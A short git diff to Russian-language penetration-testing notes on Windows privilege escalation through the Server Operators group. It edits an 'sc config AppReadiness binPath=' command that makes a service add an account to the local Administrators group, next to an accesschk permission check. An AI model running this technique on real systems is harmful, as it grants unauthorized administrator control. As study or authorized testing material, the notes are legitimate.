@@ -8,7 +8,6 @@
 - `SeBackupPrivilege` 
 - `SeRestorePrivilege`
 
-
 # Атака через **Service Binary Path Manipulation** (манипуляция путем к исполняемому файлу службы)
 
 > Для успешной атаки у нас должны быть все права на группу Server Operators на любой исполняемый сервис
@@ -19,7 +18,7 @@ accesschk.exe -uwcqv "Users" <Name_Service/AppReadiness>
 
 Далее подсовываем путь к исполняемому файлу команду для добавления нас в группу локальных администраторов
 ```powershell
-sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators <our_account_name> /add"
 ```
 
 Триггерим службу
